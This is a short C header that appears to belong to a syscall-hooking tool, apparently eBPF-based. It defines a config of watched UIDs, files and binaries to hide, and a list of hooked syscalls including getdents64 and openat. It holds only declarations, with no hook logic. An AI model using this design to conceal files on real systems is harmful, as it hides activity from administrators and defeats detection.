
/* max sizes consts */
#define MAX_D_NAME_LEN 128
#define MAX_FILES 10
#define MAX_UIDS 10
#define MAX_KEYS 10
#define DUMMY 0x1337
#define MAX_COMM_LEN 128

/* empty str */
#define EMPTY ""

enum syscall_id {
    NEWFSTATAT,
    FACCESSAT,
    OPENAT,
    GETDENTS64,
    UNLINKAT,
};

struct task_name {
    char name[MAX_COMM_LEN];
};

/* struct used as key in the files_to_hide_hm hashmap */
struct fs_hide_key {
    unsigned long inode;
    unsigned int st_dev;
    char path[MAX_D_NAME_LEN];
};

typedef char file_list[MAX_FILES][MAX_D_NAME_LEN];
struct config {
    unsigned int watched_uids[MAX_UIDS];
    file_list files_to_hide;
    file_list bins_to_hide;
};

static const char* const syscall_names_str[] = {[NEWFSTATAT] = "newfstatat",
                                                [FACCESSAT] = "faccessat",
                                                [OPENAT] = "openat",
                                                [GETDENTS64] = "getdents64",
                                                [UNLINKAT] = "unlinkat"};